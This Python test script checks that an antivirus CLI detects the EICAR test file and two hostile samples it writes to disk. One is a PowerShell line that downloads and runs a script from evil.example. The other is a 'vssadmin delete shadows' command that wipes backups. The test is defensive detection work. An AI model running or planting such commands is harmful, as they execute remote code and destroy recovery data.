"""Test de detection W1 - a executer sur le runner Windows apres demarrage
de clamd (voir .github/workflows/w1-backend.yml).

Verifie de bout en bout, via la CLI Malryx (backend/cli.py) :
  1. EICAR nu (.com)                -> detecte (ClamAV, signature)
  2. EICAR dans un zip (--archives) -> detecte (ClamAV)
  3. EICAR en double extension      -> detecte (ClamAV et/ou heuristique)
  4. Fichier propre                 -> aucune menace (exit 0)
  5. dropper.ps1 (IEX distant)      -> detecte par les heuristiques seules
  6. update.bat (vssadmin shadows)  -> detecte par les heuristiques seules

Verdict final : DETECTION_VERDICT: PASS / FAIL. Code de sortie 0 si PASS.
"""

from __future__ import annotations

import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
BACKEND = REPO / "backend"
EICAR = rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

failures: list[str] = []


def run_scan(target: Path, *extra: str) -> tuple[int, str]:
    proc = subprocess.run(
        [sys.executable, "cli.py", "scan", str(target), *extra],
        cwd=BACKEND,
        capture_output=True,
        text=True,
        timeout=300,
    )
    return proc.returncode, proc.stdout + proc.stderr


def expect(name: str, target: Path, want_threat: bool, *extra: str) -> None:
    code, out = run_scan(target, *extra)
    got_threat = code == 1
    ok = got_threat == want_threat and (code in (0, 1))
    status = "PASS" if ok else "FAIL"
    print(f"{status}: {name} (exit={code}, menace_attendue={want_threat})")
    if not ok:
        failures.append(name)
        print("----- sortie CLI -----")
        print(out[-3000:])
        print("----------------------")


def main() -> int:
    work = Path(tempfile.mkdtemp(prefix="malryx-w1-"))
    print(f"dossier de test : {work}")

    eicar = work / "eicar.com"
    eicar.write_bytes(EICAR)

    zipped = work / "eicar.zip"
    with zipfile.ZipFile(zipped, "w") as zf:
        zf.writestr("eicar.com", EICAR)

    double_ext = work / "facture.pdf.exe"
    double_ext.write_bytes(EICAR)

    clean = work / "propre.txt"
    clean.write_text("Bonjour, ceci est un fichier sain.\n", encoding="utf-8")

    dropper = work / "dropper.ps1"
    dropper.write_text(
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')\n",
        encoding="utf-8",
    )

    shadow = work / "update.bat"
    shadow.write_text(
        "@echo off\nvssadmin delete shadows /all /quiet\n",
        encoding="utf-8",
    )

    expect("EICAR nu", eicar, True)
    expect("EICAR dans zip", zipped, True, "--archives")
    expect("EICAR double extension", double_ext, True)
    expect("fichier propre", clean, False)
    expect("heuristique dropper.ps1", dropper, True, "--no-clamav", "--no-yara")
    expect("heuristique vssadmin", shadow, True, "--no-clamav", "--no-yara")

    if failures:
        print(f"DETECTION_VERDICT: FAIL ({len(failures)} echec(s) : {', '.join(failures)})")
        return 1
    print("DETECTION_VERDICT: PASS")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
